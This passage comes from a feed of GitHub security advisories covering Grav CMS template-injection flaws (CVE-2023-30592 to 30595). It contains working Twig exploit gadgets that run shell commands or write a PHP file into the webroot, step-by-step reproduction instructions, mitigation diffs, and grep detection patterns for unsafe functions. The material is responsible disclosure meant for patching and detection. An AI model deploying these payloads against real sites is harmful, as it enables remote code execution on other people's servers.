<p>It is recommended to review the list of functions, both default functions in PHP and user-defined functions, and include missing unsafe functions in the denylist. A non-exhaustive list of missing unsafe functions discovered is shown below:</p>
<ul>
<li><code>unserialize()</code></li>
<li><code>ini_alter()</code></li>
<li><code>simplexml_load_file()</code></li>
<li><code>simplexml_load_string()</code></li>
<li><code>forward_static_call()</code></li>
<li><code>forward_static_call_array()</code></li>
</ul>
<p>The <code>Utils::isDangerousFunction()</code> function in <a href="https://github.com/getgrav/grav/blob/1.7.40/system/src/Grav/Common/Utils.php#L1956-L2074">/system/src/Grav/Common/Utils.php</a> should also be patched to disallow usage of fully qualified names when specifying callables, as well as ensure that validation performed on the <code>$name</code> parameter is case-insensitive.</p>
<p>For example,</p>
<pre><code class="language-diff">...
abstract class Utils
{
    ...
    /**
     * @param string $name
     * @return bool
     */
    public static function isDangerousFunction(string $name): bool
    {
        ...
+       if ($arrow instanceof Closure) {
+           return false;
+       }

+       $name = strtolower($name);
+       if (strpos($name, "\\") !== false) {
+           return false;
+       }

        if (in_array($name, $commandExecutionFunctions)) {
            return true;
        }

        if (in_array($name, $codeExecutionFunctions)) {
            return true;
        }

        if (isset($callbackFunctions[$name])) {
            return true;
        }

        if (in_array($name, $informationDiscosureFunctions)) {
            return true;
        }

        if (in_array($name, $otherFunctions)) {
            return true;
        }

        return static::isFilesystemFunction($name);
    }
    ...
}
</code></pre>
<p>End users should also ensure that <code>twig.undefined_functions</code> and <code>twig.undefined_filters</code> properties in <code>/path/to/webroot/system/config/system.yaml</code> configuration file are set to <code>false</code> to disallow Twig from treating undefined filters/functions as PHP functions and executing them.</p>
<h2 id="detection-guidance">Detection Guidance:</h2>
<p>The following strategies may be used to detect potential exploitation attempts.</p>
<ol>
<li>Searching within Markdown pages using the following shell command:<br><code>grep -Priz -e '(ini_alter|unserialize|simplexml_load_file|simplexml_load_string|forward_static_call|forward_static_call_array|\|\s*(filter|map|reduce))\s*\(' /path/to/webroot/user/pages/</code></li>
<li>Searching within Doctrine cache data using the following shell command:<br><code>grep -Priz -e '(ini_alter|unserialize|simplexml_load_file|simplexml_load_string|forward_static_call|forward_static_call_array|\|\s*(filter|map|reduce))\s*\(' --include '*.doctrinecache.data' /path/to/webroot/cache/</code></li>
<li>Searching within Twig cache using the following shell command: 
<code>grep -Priz -e '(ini_alter|unserialize|simplexml_load_file|simplexml_load_string|forward_static_call|forward_static_call_array|twig_array_(filter|map|reduce))\s*\(' /path/to/webroot/cache/twig/</code></li>
<li>Searching within compiled Twig template files using the following shell command:<br><code>grep -Priz -e '(ini_alter|unserialize|simplexml_load_file|simplexml_load_string|forward_static_call|forward_static_call_array|\|\s*(filter|map|reduce))\s*\(' /path/to/webroot/cache/compiled/files/</code></li>
</ol>
<p>Note that it is not possible to detect indicators of compromise reliably using the Grav log file (located at <code>/path/to/webroot/logs/grav.log</code> by default), as successful exploitation attempts do not generate any additional logs. However, it is worthwhile to examine any PHP errors or warnings logged to determine the existence of any failed exploitation attempts.</p>
<h2 id="credits">Credits:</h2>
<p>Ngo Wei Lin (<a href="https://twitter.com/Creastery">@Creastery</a>) &amp; Wang Hengyue (<a href="https://twitter.com/w_hy_04">@w_hy_04</a>) of STAR Labs SG Pte. Ltd. (<a href="https://twitter.com/starlabs_sg">@starlabs_sg</a>)</p>
<p>The scheduled disclosure date is <em><strong>25th July, 2023</strong></em>. Disclosure at an earlier date is also possible if agreed upon by all parties.  </p>
<p>Kindly note that STAR Labs reserved and assigned the following CVE identifiers to the respective vulnerabilities presented in this report:  </p>
<ol>
<li><strong>CVE-2023-30592</strong>
 Server-side Template Injection (SSTI) in getgrav/grav &lt;= v1.7.40 allows Grav Admin users with page creation or update rights to bypass the dangerous functions denylist check in <code>Utils::isDangerousFunction()</code> and to achieve remote code execution via usage of unsafe functions, such as <code>unserialize()</code>, that are not blocked. This is a bypass of CVE-2022-2073.</li>
<li><strong>CVE-2023-30593</strong>
 Server-side Template Injection (SSTI) in getgrav/grav &lt;= v1.7.40 allows Grav Admin users with page creation or update rights to bypass the dangerous functions denylist check in <code>Utils::isDangerousFunction()</code> and to achieve remote code execution via usage of capitalised names, supplied as strings, when referencing callables. This is a bypass of CVE-2022-2073.</li>
<li><strong>CVE-2023-30594</strong>
 Server-side Template Injection (SSTI) in getgrav/grav &lt;= v1.7.40 allows Grav Admin users with page creation or update rights to bypass the dangerous functions denylist check in <code>Utils::isDangerousFunction()</code> and to achieve remote code execution via usage of fully-qualified names, supplied as strings, when referencing callables. This is a bypass of CVE-2022-2073.</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/getgrav/grav/security/advisories/GHSA-j3v8-v77f-fvgm">https://github.com/getgrav/grav/security/advisories/GHSA-j3v8-v77f-fvgm</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-34253">https://nvd.nist.gov/vuln/detail/CVE-2023-34253</a></li>
<li><a href="https://github.com/getgrav/grav/commit/244758d4383034fe4cd292d41e477177870b65ec">https://github.com/getgrav/grav/commit/244758d4383034fe4cd292d41e477177870b65ec</a></li>
<li><a href="https://github.com/getgrav/grav/commit/71bbed12f950de8335006d7f91112263d8504f1b">https://github.com/getgrav/grav/commit/71bbed12f950de8335006d7f91112263d8504f1b</a></li>
<li><a href="https://github.com/getgrav/grav/commit/8c2c1cb72611a399f13423fc6d0e1d998c03e5c8">https://github.com/getgrav/grav/commit/8c2c1cb72611a399f13423fc6d0e1d998c03e5c8</a></li>
<li><a href="https://github.com/getgrav/grav/commit/9d01140a63c77075ef09b26ef57cf186138151a5">https://github.com/getgrav/grav/commit/9d01140a63c77075ef09b26ef57cf186138151a5</a></li>
<li><a href="https://github.com/getgrav/grav/blob/1.7.40/system/src/Grav/Common/Utils.php#L1952-L2190">https://github.com/getgrav/grav/blob/1.7.40/system/src/Grav/Common/Utils.php#L1952-L2190</a></li>
<li><a href="https://huntr.dev/bounties/3ef640e6-9e25-4ecb-8ec1-64311d63fe66/">https://huntr.dev/bounties/3ef640e6-9e25-4ecb-8ec1-64311d63fe66/</a></li>
<li><a href="https://www.github.com/getgrav/grav/commit/9d6a2dba09fd4e56f5cdfb9a399caea355bfeb83">https://www.github.com/getgrav/grav/commit/9d6a2dba09fd4e56f5cdfb9a399caea355bfeb83</a></li>
<li><a href="https://github.com/advisories/GHSA-j3v8-v77f-fvgm">https://github.com/advisories/GHSA-j3v8-v77f-fvgm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j3v8-v77f-fvgm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-06-16T19:36:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[getgrav/grav] Grav Server-side Template Injection (SSTI) via Twig Default Filters]]></title>
        <id>https://github.com/advisories/GHSA-96xv-rmwj-6p9w</id>
        <link href="https://github.com/advisories/GHSA-96xv-rmwj-6p9w"/>
        <updated>2023-06-16T19:36:39.000Z</updated>
        <content type="html"><![CDATA[<p>Hi,</p>
<p>actually we have sent the bug report to <a href="mailto:security@getgrav.org">security@getgrav.org</a> on 27th March 2023 and on 10th April 2023.</p>
<h1 id="grav-server-side-template-injection-ssti-via-insufficient-validation-in-filterfilter">Grav Server-side Template Injection (SSTI) via Insufficient Validation in filterFilter</h1>
<h2 id="summary">Summary:</h2>
<table>
<thead>
<tr>
<th><strong>Product</strong></th>
<th>Grav CMS</th>
</tr>
</thead>
<tbody><tr>
<td><strong>Vendor</strong></td>
<td>Grav</td>
</tr>
<tr>
<td><strong>Severity</strong></td>
<td>High - Users with login access to Grav Admin panel and page creation/update permissions are able to obtain remote code/command execution</td>
</tr>
<tr>
<td><strong>Affected Versions</strong></td>
<td>&lt;= <a href="https://github.com/getgrav/grav/tree/1.7.40">v1.7.40</a> (Commit <a href="https://github.com/getgrav/grav/commit/685d76231a057416651ed192a6a2e83720800e61">685d762</a>) (Latest version as of writing)</td>
</tr>
<tr>
<td><strong>Tested Versions</strong></td>
<td>v1.7.40</td>
</tr>
<tr>
<td><strong>Internal Identifier</strong></td>
<td>STAR-2023-0007</td>
</tr>
<tr>
<td><strong>CVE Identifier</strong></td>
<td>TBD</td>
</tr>
<tr>
<td><strong>CWE(s)</strong></td>
<td>CWE-20: Improper Input Validation, CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine</td>
</tr>
</tbody></table>
<h2 id="cvss31-scoring-system">CVSS3.1 Scoring System:</h2>
<p><strong>Base Score:</strong> 7.2 (High)<br><strong>Vector String:</strong> <code>CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H</code>  </p>
<table>
<thead>
<tr>
<th><strong>Metric</strong></th>
<th><strong>Value</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>Attack Vector (AV)</strong></td>
<td>Network</td>
</tr>
<tr>
<td><strong>Attack Complexity (AC)</strong></td>
<td>Low</td>
</tr>
<tr>
<td><strong>Privileges Required (PR)</strong></td>
<td>High</td>
</tr>
<tr>
<td><strong>User Interaction (UI)</strong></td>
<td>None</td>
</tr>
<tr>
<td><strong>Scope (S)</strong></td>
<td>Unchanged</td>
</tr>
<tr>
<td><strong>Confidentiality (C)</strong></td>
<td>High</td>
</tr>
<tr>
<td><strong>Integrity (I)</strong></td>
<td>High</td>
</tr>
<tr>
<td><strong>Availability (A)</strong></td>
<td>High</td>
</tr>
</tbody></table>
<h2 id="product-overview">Product Overview:</h2>
<p>Grav is a PHP-based flat-file content management system (CMS) designed to provide a fast and simple way to build websites. It supports rendering of web pages written in Markdown and Twig expressions, and provides an administration panel to manage the entire website via an optional Admin plugin.</p>
<h2 id="vulnerability-summary">Vulnerability Summary:</h2>
<p>There is a logic flaw in the <code>GravExtension.filterFilter()</code> function whereby validation against a denylist of unsafe functions is only performed when the argument passed to filter is a string. However, passing an array as a callable argument allows the validation check to be skipped. Consequently, a low privileged attacker with login access to Grav Admin panel and page creation/update permissions is able to inject malicious templates to obtain remote code execution.</p>
<h2 id="vulnerability-details">Vulnerability Details:</h2>
<p>The vulnerability can be found in the <code>GravExtension.filterFilter()</code> function declared in <a href="https://github.com/getgrav/grav/blob/1.7.40/system/src/Grav/Common/Twig/Extension/GravExtension.php#L1692-L1698"><code>/system/src/Grav/Common/Twig/Extension/GravExtension.php</code></a>:</p>
<pre><code class="language-php">...
class GravExtension extends AbstractExtension implements GlobalsInterface
{
    ...
    
    /**
     * Return a list of all filters.
     *
     * @return array
     */
    public function getFilters(): array
    {
        return [
            ...
            
            // Security fix
            new TwigFilter('filter', [$this, 'filterFilter'], ['needs_environment' =&gt; true]),
        ];
    }

    ...

    /**
     * @param Environment $env
     * @param array $array
     * @param callable|string $arrow
     * @return array|CallbackFilterIterator
     * @throws RuntimeError
     */
    function filterFilter(Environment $env, $array, $arrow)
    {
        if (is_string($arrow) &amp;&amp; Utils::isDangerousFunction($arrow)) { // [1]
            throw new RuntimeError('Twig |filter("' . $arrow . '") is not allowed.');
        }

        return \twig_array_filter($env, $array, $arrow); // [2]
    }
}
</code></pre>
<p>At [1], the <code>$arrow</code> parameter contains the argument supplied to the filter. For example, it may refer to <code>"funcname"</code> in <code>{{ array|filter("funcname") }}</code> or the closure (a.k.a. arrow function) <code>el =&gt; el != 'exclude'</code> in <code>{{ array|filter(el =&gt; el != 'exclude') }}</code>. Observe that <code>Utils::isDangerousFunction($arrow)</code> is only invoked if <code>$arrow</code> is a string. As such, non-string arguments may be passed to <code>twig_array_filter()</code> at [2] due to the absence of type enforcement at [1].</p>
<p>The implementation of the <code>twig_array_filter()</code> function can be found in <a href="https://github.com/twigphp/Twig/blob/v1.44.7/src/Extension/CoreExtension.php">/src/Extension/CoreExtension.php</a> within Twig's codebase:</p>
<pre><code class="language-php">function twig_array_filter(Environment $env, $array, $arrow)
{
    if (!twig_test_iterable($array)) {
        throw new RuntimeError(sprintf('The "filter" filter expects an array or "Traversable", got "%s".', \is_object($array) ? \get_class($array) : \gettype($array)));
    }

    if (!$arrow instanceof Closure &amp;&amp; $env-&gt;hasExtension('\Twig\Extension\SandboxExtension') &amp;&amp; $env-&gt;getExtension('\Twig\Extension\SandboxExtension')-&gt;isSandboxed()) { // [3]
        throw new RuntimeError('The callable passed to "filter" filter must be a Closure in sandbox mode.');
    }

    if (\is_array($array)) {
        if (\PHP_VERSION_ID &gt;= 50600) {
            return array_filter($array, $arrow, \ARRAY_FILTER_USE_BOTH); // [4]
        }

        return array_filter($array, $arrow);
    }

    // the IteratorIterator wrapping is needed as some internal PHP classes are \Traversable but do not implement \Iterator
    return new \CallbackFilterIterator(new \IteratorIterator($array), $arrow);
}
</code></pre>
<p>At [3], a runtime error is thrown if <code>$arrow</code> is not a closure and Twig sandbox is enabled. However, since Grav does not use the Twig Sandbox extension, the check passes successfully even when <code>$arrow</code> is not a closure. Subsequently at [4], <code>array_filter()</code> is invoked with the user-controlled <code>$array</code> input and <code>$arrow</code> parameter.</p>
<p>Note that the method signature of <code>array_filter()</code> is as follows:</p>
<pre><code class="language-php">array_filter(array $array, ?callable $callback = null, int $mode = 0): array
</code></pre>
<p>A common mistake that developers make is assuming that the <code>callable</code> type refers to a <code>string</code> type. This is untrue, and it is <a href="https://www.php.net/manual/en/language.types.callable.php">well documented in the PHP Manual</a>:</p>
<blockquote>
<p>A method of an instantiated object is passed as an <strong>array containing an object at index 0 and the method name at index 1</strong>. Accessing protected and private methods from within a class is allowed.
Static class methods can also be passed without instantiating an object of that class by either, <strong>passing the class name instead of an object at index 0, or passing <code>ClassName::methodName</code></strong>.</p>
</blockquote>
<p>This means that all of the following method calls are valid:</p>
<pre><code class="language-php">// Type 1: Simple callback -- invokes system("id")
array_filter(array("id"), "system");

// Type 2: Static class method call -- invokes Class::staticMethod($arg)
array_filter(array($arg), array("Class", "staticMethod"));
array_filter(array($arg), array("Class::staticMethod")); // same as above

// Type 3: Object method call -- invokes $obj-&gt;method($arg)
array_filter(array($arg), array($obj, "method"));
</code></pre>
<p>Going back to [1], if <code>$arrow</code> is an <code>array</code> instead of a <code>string</code> or <code>closure</code>, the validation check to prevent invocation of unsafe functions is completely skipped. Multiple static class methods within Grav's codebase and its dependencies were found to be suitable gadgets for achieving for remote code execution:</p>
<pre><code class="language-twig">// Gadget 1: Using \Grav\Common\Utils::arrayFilterRecursive() within Grav's codebase to invoke system("id"):
{% set id = {'id': 0} %}
{{ {'system': id} | filter('\\Grav\\Common\\Utils', 'arrayFilterRecursive') }}

// Gadget 2: Using \Symfony\Component\VarDumper\Vardumper::setHandler() and \Symfony\Component\VarDumper\Vardumper::dump() to invoke system("id"):
{{ ['system'] | filter(['\\Symfony\\Component\\VarDumper\\VarDumper', 'setHandler'])}}
{{ ['id'] | filter(['\\Symfony\\Component\\VarDumper\\VarDumper', 'dump']) }}

// Gadget 3: Using \RocketTheme\Toolbox\File\File::instance() in Grav's default theme to perform arbitrary file write to rce.php in the webroot:
{{ (['rce.php'] | map(['\\RocketTheme\\Toolbox\\File\\File', 'instance']))[0].save('&lt;?php echo phpinfo(); ') }}

// Gadget 4: Using \Symfony\Component\Process\Process::fromShellCommandline() to invoke system("id"):
{{ {'/':'sleep 3'} | map(['\\Symfony\\Component\\Process\\Process', 'fromShellCommandline']) | map(e =&gt; e.run()) | print_r }}
</code></pre>
<h2 id="exploit-conditions">Exploit Conditions:</h2>
<p>This vulnerability can be exploited if the attacker has access to:</p>
<ol>
<li>an administrator account, or</li>
<li>a non-administrator, user account that are granted the following permissions:<ul>
<li>login access to Grav admin panel, and</li>
<li>page creation or update rights</li>
</ul>
</li>
</ol>
<h2 id="reproduction-steps">Reproduction Steps:</h2>
<ol>
<li>Log in to Grav Admin using an administrator account.</li>
<li>Navigate to <code>Accounts &gt; Add</code>, and ensure that the following permissions are assigned when creating a new low-privileged user:<ul>
<li>Login to Admin - Allowed</li>
<li>Page Update - Allowed</li>
</ul>
</li>
<li>Log out of Grav Admin, and log back in using the account created in step 2.</li>
<li>Navigate to <code>http://&lt;grav_installation&gt;/admin/pages/home</code>.</li>
<li>Click the <code>Advanced</code> tab and select the checkbox beside <code>Twig</code> to ensure that Twig processing is enabled for the modified webpage.</li>
<li>Under the <code>Content</code> tab, insert the following payload within the editor:<pre><code class="language-twig">// Gadget 1: Using \Grav\Common\Utils::arrayFilterRecursive() within Grav's codebase to invoke system("id"):
{% set id = {'id': 0} %}
{{ {'system': id} | filter('\\Grav\\Common\\Utils', 'arrayFilterRecursive') }}
</code></pre>
</li>
<li>Click the Preview button. Observe that the output of the <code>id</code> shell command is returned in the preview.</li>
</ol>
<h2 id="suggested-mitigations">Suggested Mitigations:</h2>
<p>Patch the logic flaw in the <code>GravExtension.filterFilter()</code> function declared in <code>/system/src/Grav/Common/Twig/Extension/GravExtension.php</code> to ensure that the <code>$arrow</code> paramater passed to the <code>filterFilter()</code> function must either be a <code>string</code> or an arrow function as such:</p>
<pre><code class="language-diff">...
class GravExtension extends AbstractExtension implements GlobalsInterface
{
    ...

    /**
     * @param Environment $env
     * @param array $array
     * @param callable|string $arrow
     * @return array|CallbackFilterIterator
     * @throws RuntimeError
     */
    function filterFilter(Environment $env, $array, $arrow)
    {
-       if (is_string($arrow) &amp;&amp; Utils::isDangerousFunction($arrow)) {
+       if (!$arrow instanceof Closure &amp;&amp; !is_string($arrow) || Utils::isDangerousFunction($arrow)) {
            throw new RuntimeError('Twig |filter("' . $arrow . '") is not allowed.');
        }

        return \twig_array_filter($env, $array, $arrow);
    }
}
</code></pre>
<p><code>Utils::isDangerousFunction()</code> in <a href="https://github.com/getgrav/grav/blob/1.7.40/system/src/Grav/Common/Utils.php#L1956-L2074">/system/src/Grav/Common/Utils.php</a> should also be patched to prevent static class methods from being invoked. For example,</p>
<pre><code class="language-diff">...
abstract class Utils
{
    ...
    /**
     * @param string $name
     * @return bool
     */
    public static function isDangerousFunction(string $name): bool
    {
        ...

+       if (is_array($name) || strpos($name, ":") !== false) {
+           return false;
+       }

        if (in_array($name, $commandExecutionFunctions)) {
            return true;
        }

        if (in_array($name, $codeExecutionFunctions)) {
            return true;
        }

        if (isset($callbackFunctions[$name])) {
            return true;
        }

        if (in_array($name, $informationDiscosureFunctions)) {
            return true;
        }

        if (in_array($name, $otherFunctions)) {
            return true;
        }

        return static::isFilesystemFunction($name);
    }
    ...
}
</code></pre>
<p>End users should also ensure that <code>twig.undefined_functions</code> and <code>twig.undefined_filters</code> properties in <code>/path/to/webroot/system/config/system.yaml</code> configuration file are set to <code>false</code> to disallow Twig from treating undefined filters/functions as PHP functions and executing them.</p>
<h2 id="detection-guidance">Detection Guidance:</h2>
<p>The following strategies may be used to detect potential exploitation attempts.</p>
<ol>
<li>Searching within Markdown pages using the following shell command:<br><code>grep -Priz -e '\|\s*(filter|map|reduce)\s*\(' /path/to/webroot/user/pages/</code></li>
<li>Searching within Doctrine cache data using the following shell command:<br><code>grep -Priz -e '\|\s*(filter|map|reduce)\s*\('  --include '*.doctrinecache.data' /path/to/webroot/cache/</code></li>
<li>Searching within Twig cache using the following shell command:<br><code>grep -Priz -e 'twig_array_(filter|map|reduce)' /path/to/webroot/cache/twig/</code></li>
<li>Searching within compiled Twig template files using the following shell command:<br><code>grep -Priz -e '\|\s*(filter|map|reduce)\s*\(' /path/to/webroot/cache/compiled/files/</code></li>
</ol>
<p>Note that it is not possible to detect indicators of compromise reliably using the Grav log file (located at <code>/path/to/webroot/logs/grav.log</code> by default), as successful exploitation attempts do not generate any additional logs. However, it is worthwhile to examine any PHP errors or warnings logged to determine the existence of any failed exploitation attempts.</p>
<h2 id="credits">Credits:</h2>
<p>Ngo Wei Lin (<a href="https://twitter.com/Creastery">@Creastery</a>) &amp; Wang Hengyue (<a href="https://twitter.com/w_hy_04">@w_hy_04</a>) of STAR Labs SG Pte. Ltd. (<a href="https://twitter.com/starlabs_sg">@starlabs_sg</a>)</p>
<p>Kindly note that STAR Labs reserved and assigned the following CVE identifiers to the respective vulnerabilities presented in this report:  </p>
<ol>
<li><strong>CVE-2023-30595</strong>
 Server-side Template Injection (SSTI) in getgrav/grav &lt;= v1.7.40 allows Grav Admin users with page creation or update rights to bypass the dangerous functions denylist check in <code>GravExtension.filterFilter()</code> and to achieve remote code execution via usage of fully-qualified names, supplied as arrays of strings, when referencing callables. This is a bypass of CVE-2022-2073.</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/getgrav/grav/security/advisories/GHSA-96xv-rmwj-6p9w">https://github.com/getgrav/grav/security/advisories/GHSA-96xv-rmwj-6p9w</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-34252">https://nvd.nist.gov/vuln/detail/CVE-2023-34252</a></li>
<li><a href="https://github.com/getgrav/grav/commit/244758d4383034fe4cd292d41e477177870b65ec">https://github.com/getgrav/grav/commit/244758d4383034fe4cd292d41e477177870b65ec</a></li>
<li><a href="https://github.com/getgrav/grav/commit/71bbed12f950de8335006d7f91112263d8504f1b">https://github.com/getgrav/grav/commit/71bbed12f950de8335006d7f91112263d8504f1b</a></li>
<li><a href="https://github.com/getgrav/grav/commit/8c2c1cb72611a399f13423fc6d0e1d998c03e5c8">https://github.com/getgrav/grav/commit/8c2c1cb72611a399f13423fc6d0e1d998c03e5c8</a></li>
<li><a href="https://github.com/getgrav/grav/commit/9d01140a63c77075ef09b26ef57cf186138151a5">https://github.com/getgrav/grav/commit/9d01140a63c77075ef09b26ef57cf186138151a5</a></li>
<li><a href="https://github.com/getgrav/grav/blob/1.7.40/system/src/Grav/Common/Twig/Extension/GravExtension.php#L1692-L1698">https://github.com/getgrav/grav/blob/1.7.40/system/src/Grav/Common/Twig/Extension/GravExtension.php#L1692-L1698</a></li>
<li><a href="https://github.com/getgrav/grav/blob/1.7.40/system/src/Grav/Common/Utils.php#L1956-L2074">https://github.com/getgrav/grav/blob/1.7.40/system/src/Grav/Common/Utils.php#L1956-L2074</a></li>
<li><a href="https://github.com/advisories/GHSA-96xv-rmwj-6p9w">https://github.com/advisories/GHSA-96xv-rmwj-6p9w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-96xv-rmwj-6p9w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-06-16T19:36:39.000Z</published>
    </entry>
</feed>